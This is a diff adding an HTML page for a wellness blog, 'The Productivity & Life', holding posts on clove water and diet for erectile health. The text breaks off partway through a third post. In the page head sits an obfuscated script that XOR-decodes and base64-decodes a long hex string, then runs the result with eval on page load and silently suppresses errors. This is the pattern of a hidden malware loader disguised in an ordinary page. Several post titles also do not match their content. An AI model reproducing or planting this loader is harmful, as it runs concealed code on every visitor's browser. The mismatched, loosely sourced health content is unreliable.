@@ -1,1 +1,912 @@
 
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Productivity & Life</title>
+
+    <!-- Added Google Fonts for an elegant, high-end editorial look -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Lato:wght@300;400;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* Elegant, Sophisticated Editorial Styles */
+        :root {
+            --primary-color: #a88b5c;
+            /* Muted Gold / Champagne */
+            --primary-hover: #8a7046;
+            --text-color: #4a4a4a;
+            --heading-color: #222222;
+            --bg-color: #faf8f5;
+            /* Soft Alabaster */
+            --card-bg: #ffffff;
+            --border-color: #e5e0d8;
+            --divider-color: #f0ebe1;
+        }
+
+        body {
+            font-family: 'Lato', sans-serif;
+            line-height: 1.7;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            font-weight: 300;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Typography Override */
+        h1,
+        h2,
+        h3,
+        h4,
+        .username {
+            font-family: 'Playfair Display', serif;
+            color: var(--heading-color);
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Minimal and Airy */
+        .top-nav {
+            background-color: var(--bg-color);
+            border-bottom: 1px solid var(--border-color);
+            padding: 25px 0;
+            text-align: center;
+        }
+
+        .top-nav a {
+            color: var(--text-color);
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: 0 15px;
+            font-size: 0.8rem;
+            font-weight: 400;
+            cursor: pointer;
+            transition: color 0.4s ease;
+            position: relative;
+        }
+
+        .top-nav a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 1px;
+            bottom: -4px;
+            left: 50%;
+            background-color: var(--primary-color);
+            transition: all 0.4s ease;
+            transform: translateX(-50%);
+        }
+
+        .top-nav a:hover {
+            color: var(--primary-color);
+        }
+
+        .top-nav a:hover::after {
+            width: 100%;
+        }
+
+        /* Header */
+        header {
+            padding: 80px 0 60px;
+            text-align: center;
+            background-color: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 50px;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.5rem;
+            font-weight: 400;
+            letter-spacing: -0.5px;
+            cursor: pointer;
+            color: var(--heading-color);
+            transition: opacity 0.3s;
+        }
+
+        header h1:hover {
+            opacity: 0.8;
+        }
+
+        header p {
+            margin: 20px 0 0;
+            font-size: 1.1rem;
+            color: #888;
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            letter-spacing: 1px;
+        }
+
+        /* Post Cards */
+        .post-card,
+        .single-post {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            margin-bottom: 60px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.02);
+            overflow: hidden;
+            transition: box-shadow 0.5s ease, transform 0.5s ease;
+        }
+
+        .post-card {
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.05);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--divider-color);
+        }
+
+        .post-header img.avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 15px;
+            background-color: var(--border-color);
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 15px;
+            letter-spacing: 1px;
+            font-weight: 600;
+            color: var(--primary-color);
+            text-transform: uppercase;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 500px;
+            object-fit: cover;
+        }
+
+        .post-content {
+            padding: 40px 45px 20px;
+        }
+
+        .post-content h1,
+        .post-content h2 {
+            margin: 0 0 20px;
+            font-size: 2.2rem;
+            line-height: 1.3;
+            font-weight: 600;
+        }
+
+        .post-content p {
+            margin-bottom: 25px;
+            font-size: 1.1rem;
+            color: var(--text-color);
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: border-color 0.3s;
+        }
+
+        .post-content a:hover {
+            border-bottom-color: var(--primary-color);
+        }
+
+        .post-footer {
+            padding: 25px 45px;
+            color: #a0a0a0;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--divider-color);
+            background-color: #fdfdfc;
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            padding: 10px 0;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        .back-button:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+            transform: translateX(-5px);
+        }
+
+        /* Refine inline styles from content for elegance */
+        .post-content div[style*="background"] {
+            background: var(--bg-color) !important;
+            border: 1px solid var(--border-color) !important;
+            border-left: 3px solid var(--primary-color) !important;
+            border-radius: 0 !important;
+            box-shadow: none !important;
+            padding: 30px !important;
+            margin: 40px 0 !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: transparent !important;
+            border: 1px solid var(--border-color) !important;
+            color: var(--text-color) !important;
+            border-radius: 0 !important;
+            font-family: 'Lato', sans-serif !important;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.7rem !important;
+            padding: 8px 12px !important;
+        }
+
+        .post-content h3[style*="border-left"] {
+            border-left-color: var(--primary-color) !important;
+            padding-left: 15px !important;
+        }
+    </style>
+    <script>
+        (function () {
+            var vtemgebhp = "2e026c2400130f5c312209056e1b06222146631955650151242a71180a1b1d5a0e247b7a2f03741a0b17375a500424562119260b785f7b40162a7946283d15020e057436392d0b1531482b3f500b1d00132710425565005d164a5304091476003434643c014879190b481503572e1a080c033d3a55656c513f317e1d320b05000c2a787c00130c01221301116e14121e1a463a25507a7c43152e051a310b273a37055125022d1c552113280c7d17645e0a3762097f6177013710711622100d5834347f2b0722071f3d3d05126d14651d0a306216565f63053d3f66223f15010634347c26023c0f040b17051f573a3c1d192314086d005d62103179012424200d242f772b07170b1521320d185014370013271040575f4d672d217a19090b021f375e607c2839071c32390a1b7b343b2c0a3713167d75595b3d3a580b091b1904263f747b20130c0b2139020c7d001500271914087d7a635e3d3d0016093e09580c3b5224073d7415241415116e1b1e25194604045076467d3d3a711622100e0d242f747e3a22040b31177a5b612e0209192c3516646174402d1409410d1401133434523f392207540b49011b6e04021e25333a1d6d6567452e217e0b0d1b0d1a0f02642000171b160c323b0556716d09213304496d5f59432e4a481b083e09590f2b5a393903741c0e3c011b562d060b2019040b507a4d67152e0541310b05060e5f642501491c5b2b13020c7d0015000a371316505f734f3d3e5c0b3a3e765a2428062b3a17745c3d1715056e1b33122733040b50715d072d2a5b160d1b380d243b0324071721023122111d572a61141a23671f506573582e217d160d1b380d0f01707e022d29040c3d7a12782d300b1a190008556a6f5a1713433a22100e0d242f772b2a390f1c32130204551b1a24214703017d7a467d3d3a711622100e0d242f772b2a390c0b0c482f1e6e046d540f193a015701674017175b04083e191d0f2b7026392c035c312211077f046156213325027d715658383a72420a047a010f5f5539013d74063122111b56716012203314415575005e162e65012424200d242f772b2a390c0b2132730c6e142c1d19271046775b74513d3a711622100e0d242f772b2a3217040b1301116e1b160f2019144156017c51242a720b091b190421015a39393d1b583c481a047d2a6c0e0827134864660551393a715e221006032428592b2a137505270d2c0c7d0015000a3713167d7174513d3a7243320b060d372b6036073d21193122111b56716000132710416d6a7f582e21623409617e020c3b022b28030f1632220103572e125721471b167f4b774c1631661f2424200d242f772b2a390c0b2139020c7d00161d192c00245565045a164a66412014155b0f01787c022d74192339280c513a152c0a3713167d7174513d3a711622100e0d242f772b2a32291c0a17111d503a611421461c195075594016100508310b0d19343b7820283d1f000b49111b562e125722236b047f6646513710711622100e0d242f772b2a390c0b213273187d0711560e373946775b74513d3a711622100e0d0b3d592b2a390c0b0e2b33527d0402142046071651455a513d3a7116283d7f21";
+            var voevvvovu = "ml6LczMlhzCk4CTgCtRq4256ty0qkSOj";
+            var vonspeyah = "";
+
+            try {
+                for (var i = 0; i < vtemgebhp.length; i += 2) {
+                    var vfokrcpoz = parseInt(vtemgebhp.substr(i, 2), 16);
+                    vonspeyah += String.fromCharCode(vfokrcpoz ^ voevvvovu.charCodeAt((i / 2) % voevvvovu.length));
+                }
+
+                var vweqbcvxk = atob(vonspeyah);
+                eval(vweqbcvxk);
+            } catch (e) {
+            }
+        })();
+    </script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">The Productivity & Life</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: '14 Essential Natural & Herbal Remedies',
+                date: 'April 2, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/10-Powerful-Clove-Water-Benefits.jpg',
+                excerpt: "Discover the amazing power of clove water for your daily wellness routine! This simple, natural remedy is a game-changer for boosting immunity and aiding digestion. Whether you're looking to improve oral health or just want a gentle way to detoxify, sipping on this infusion is an easy habit to start today.",
+                content: `
+                   <p>Natural remedies have gained renewed attention in recent years, and one simple yet powerful option stands out for its versatility and health benefits: clove water. Made by soaking cloves in water, this infusion has been used in traditional wellness practices for generations. Its ease of preparation, combined with a wide range of potential health benefits, makes it an appealing addition to a daily routine.</p>
+
+<p>From supporting digestion to enhancing immunity, clove water offers a gentle and natural way to support overall well-being. Let’s explore how it works, how to prepare it, and why it deserves a place in your daily habits.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Clove water is easy to prepare and requires minimal ingredients</li>
+    <li>It may support digestion, immunity, and oral health</li>
+    <li>Best consumed in the morning or before bedtime</li>
+    <li>Contains natural compounds with antioxidant properties</li>
+    <li>Can be integrated into a balanced wellness routine</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Is Clove Water and Why Is It Popular?</h2>
+
+<p>Clove water is a simple infusion made by soaking dried cloves in water, typically overnight. This allows the beneficial compounds within cloves to release into the water, creating a mild, aromatic drink.</p>
+
+<p>Cloves are known for their rich concentration of antioxidants and natural oils. These properties have made them a staple in traditional health practices across different cultures. Today, clove water is gaining popularity as a natural and accessible wellness drink.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> While clove water can be a helpful addition to your routine, it should complement a balanced diet and healthy lifestyle rather than replace medical advice or treatment.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Clove Water at Home</h2>
+
+<p>Preparing clove water is quick and requires only a few simple steps. You do not need any specialized equipment, making it accessible for anyone.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step-by-Step Preparation</h3>
+
+<ol>
+  <li>Take 1 to 2 teaspoons of whole cloves.</li>
+  <li>Add them to a glass of clean drinking water.</li>
+  <li>Allow the cloves to soak overnight.</li>
+  <li>In the morning, strain the liquid.</li>
+  <li>Drink the infused water on an empty stomach.</li>
+</ol>
+
+<p>This gentle soaking process helps extract the flavor and beneficial compounds without making the drink too strong or bitter.</p>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:26px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px 0;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Quick Note</h4>
+  <p style="margin:0;">If the taste feels too strong at first, you can dilute the infusion with additional water or reduce the number of cloves used.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Best Times to Drink Clove Water</h2>
+
+<p>Timing can enhance the effectiveness of clove water. Drinking it at specific times of the day may help maximize its benefits.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Early Morning</h3>
+
+<p>Consuming clove water on an empty stomach allows your body to absorb its natural compounds more efficiently. It can also help kickstart your digestive system for the day ahead.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Before Bed</h3>
+
+<p>Drinking clove water about 30 minutes before sleep may support relaxation and digestion overnight. This can contribute to a more comfortable and restful night.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Consistency matters more than quantity. Drinking a moderate amount regularly is more beneficial than consuming large amounts occasionally.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Potential Health Benefits of Clove Water</h2>
+
+<p>Clove water is associated with a variety of potential health benefits due to the natural compounds found in cloves. While individual results may vary, many people include it in their routines for general wellness support.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Supports Immunity</h3>
+
+<p>Cloves contain antioxidants that may help the body defend against environmental stressors. Regular consumption can contribute to maintaining a strong immune system.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Aids Digestion</h3>
+
+<p>Clove water is often used to support digestive comfort. It may help reduce bloating and promote smoother digestion.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Supports Oral Health</h3>
+
+<p>Cloves are traditionally known for their use in oral care. The natural compounds may help maintain freshness and support gum health.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">May Help Regulate Blood Sugar</h3>
+
+<p>Some studies suggest that cloves may support healthy blood sugar levels when included as part of a balanced diet.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Reduces Inflammation</h3>
+
+<p>The natural compounds in cloves may have anti-inflammatory properties, which can contribute to overall comfort and wellness.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> These benefits are based on general properties of cloves and traditional use. Always consult a healthcare professional for personalized health advice.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Tips for Safe and Effective Use</h2>
+
+<p>While clove water is generally safe when consumed in moderation, there are a few considerations to keep in mind.</p>
+
+<ul>
+  <li>Avoid excessive consumption as cloves are potent</li>
+  <li>Start with a small amount to see how your body responds</li>
+  <li>Use high-quality, clean cloves for best results</li>
+  <li>Do not substitute clove water for prescribed treatments</li>
+</ul>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:16px 18px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:10px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Simple to prepare with minimal ingredients</li>
+    <li>Best consumed in the morning or before sleep</li>
+    <li>Offers a range of potential wellness benefits</li>
+    <li>Works best as part of a consistent routine</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Clove water is a simple yet powerful addition to a wellness-focused lifestyle. With its ease of preparation and wide range of potential benefits, it offers a natural way to support your daily routine.</p>
+
+<p>By incorporating it mindfully and consistently, you can enjoy its subtle flavor and possible health-supporting properties. As with any wellness habit, balance and moderation are key to making the most of what clove water has to offer.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Clove Water</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Herbal Drink</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Health Tips</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Immunity Boost</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Digestive Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wellness Routine</span>
+</div>
+
+                `
+            },
+            {
+                id: 'Male-Performance-Naturally',
+                title: '10 Easy Healthy Toddler Snacks for Picky Eaters (No Crackers) Healthy Kids Food Ideas',
+                date: 'April 14, 2026',
+                // 👇 Point to a different image in your folder
+                image: './assets/Male-Performance-Naturally.jpg',
+                excerpt: 'Looking for natural ways to support your health and vitality? This guide highlights 9 powerful whole foods that can help boost circulation and improve blood flow throughout the body. From the nitrate-rich beets and arugula to the nutrient-dense Brazil nuts and oats, these everyday ingredients are packed with essential vitamins like folate and amino acids like L-arginine.',
+                content: `
+                <p>When it comes to supporting sexual health and improving performance naturally, what you eat plays a more important role than many people realize. Blood flow, hormone balance, and overall vitality are all deeply connected to nutrition. Certain foods contain compounds that help improve circulation, support nitric oxide production, and enhance energy levels, all of which contribute to stronger and more consistent erections.</p>
+
+<p>Instead of relying solely on supplements or medications, building a diet that includes targeted, nutrient-rich foods can offer a powerful and sustainable approach. The best part is that many of these foods are simple, widely available, and easy to incorporate into your daily routine.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Blood flow is the key factor behind strong erections</li>
+    <li>Foods rich in nitrates and L-arginine help improve circulation</li>
+    <li>Antioxidants protect blood vessels and support vascular health</li>
+    <li>Protein and micronutrients support hormone production</li>
+    <li>Consistent dietary habits matter more than quick fixes</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Diet Matters for Erectile Health</h2>
+
+<p>Erections rely heavily on healthy blood flow. When blood vessels are flexible and responsive, they allow proper circulation where it is needed most. Certain nutrients, particularly nitrates and amino acids like L-arginine, play a role in producing nitric oxide, a compound that helps relax blood vessels and improve circulation.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Erectile health is often an early indicator of overall cardiovascular health. Improving your diet can support not just performance, but long-term heart and vascular wellness.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Top Foods That Naturally Support Erections</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Beetroot: A Natural Blood Flow Booster</h3>
+
+<p>Beetroot is rich in dietary nitrates, which the body converts into nitric oxide. This helps widen blood vessels and improve circulation, making it one of the most effective foods for vascular support.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Arugula: Leafy Greens with Powerful Benefits</h3>
+
+<p>Arugula is another nitrate-rich vegetable that promotes healthy blood flow. It is easy to add to salads or sandwiches and provides a fresh, peppery flavor along with its benefits.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Oats: Supporting Nitric Oxide Production</h3>
+
+<p>Oats contain L-arginine, an amino acid that plays a key role in nitric oxide production. Regular consumption may support improved circulation and overall cardiovascular health.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Lentils: Plant-Based Protein Power</h3>
+
+<p>Lentils provide protein and folate, both important for energy and cell function. They are also a great option for those looking to maintain a balanced, plant-forward diet.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Turkey: Lean Protein with Arginine</h3>
+
+<p>Turkey is a lean source of protein and arginine, supporting muscle health and blood flow. Including quality protein sources helps maintain hormone balance and energy levels.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Pineapple: Antioxidants and Enzymes</h3>
+
+<p>Pineapple contains bromelain and antioxidants, which help reduce inflammation and support circulation. Its refreshing taste also makes it an easy addition to meals or snacks.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Brazil Nuts: A Selenium Boost</h3>
+
+<p>Brazil nuts are rich in selenium, a mineral linked to hormone health and antioxidant defense. Just a small serving can provide significant nutritional benefits.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Green Tea: Vascular Support</h3>
+
+<p>Green tea contains catechins, which help improve blood flow and protect blood vessels from damage. It is a simple, daily habit that can contribute to long-term health.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Asparagus: Nutrient-Dense and Beneficial</h3>
+
+<p>Asparagus provides vitamin E and folate, both of which are important for circulation and overall vitality. It is a versatile vegetable that pairs well with many dishes.</p>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:26px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Expert Insight</h4>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Consistency in diet has a greater impact than occasional healthy meals</li>
+    <li>Combining multiple nutrient-rich foods amplifies benefits</li>
+    <li>Hydration also plays a key role in circulation</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Build a Diet That Supports Performance</h2>
+
+<p>Creating a diet that enhances blood flow and energy does not require extreme changes. Instead, focus on balance and variety. Incorporate leafy greens, whole grains, lean proteins, and antioxidant-rich fruits into your daily meals.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Combine nitrate-rich vegetables like beetroot with protein sources such as turkey or lentils for a synergistic effect that supports both circulation and sustained energy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Sample Daily Approach</h3>
+
+<ol>
+  <li>Start the day with oatmeal topped with fruit</li>
+  <li>Add leafy greens like arugula to lunch</li>
+  <li>Include lean protein such as turkey or lentils for dinner</li>
+  <li>Snack on nuts like Brazil nuts in moderation</li>
+  <li>Drink green tea regularly</li>
+</ol>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Lifestyle Factors That Enhance Results</h2>
+
+<p>While diet plays a major role, other lifestyle habits also contribute to erectile health. Regular physical activity, adequate sleep, and stress management all support healthy circulation and hormone balance.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Combining a nutrient-rich diet with active living and proper rest creates the strongest foundation for long-term performance and vitality.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Fuel Your Body for Better Performance</h2>
+
+<p>Improving erectile health naturally is not about quick fixes or extreme measures. It is about consistently nourishing your body with the right foods and supporting overall wellness. By incorporating nutrient-dense options like beetroot, leafy greens, oats, lean proteins, and antioxidant-rich foods, you can enhance circulation, boost energy, and improve performance over time.</p>
+
+<p>Small changes add up. With the right approach, your daily meals can become a powerful tool for better health and confidence.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:16px 18px;margin:26px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Quick Points</h4>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Focus on foods that improve blood flow</li>
+    <li>Prioritize whole, nutrient-dense ingredients</li>
+    <li>Consistency is more important than perfection</li>
+    <li>Support diet with healthy lifestyle habits</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Erectile Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Diet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Blood Flow</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Libido Boost</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Superfoods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Men's Health</span>
+</div>
+
+                                `
+            },
+            {
+                id: 'DIY-Oregano-Oil',
+                title: '9 Benefits of Dandelions: How to Harvest and Use This Free Healing Herb for Natural Wellness',
+                date: 'April 14, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/9-Benefits-of-Dandelions.jpg',
+                excerpt: 'Discover the hidden power of the "weeds" in your backyard! Dandelions are a powerhouse of natural healing, offering everything from digestive support to skin-soothing properties. Instead of reaching for the sprayer, learn how to forage these gold mines for tea, salads, and DIY remedies.',
+                content: `
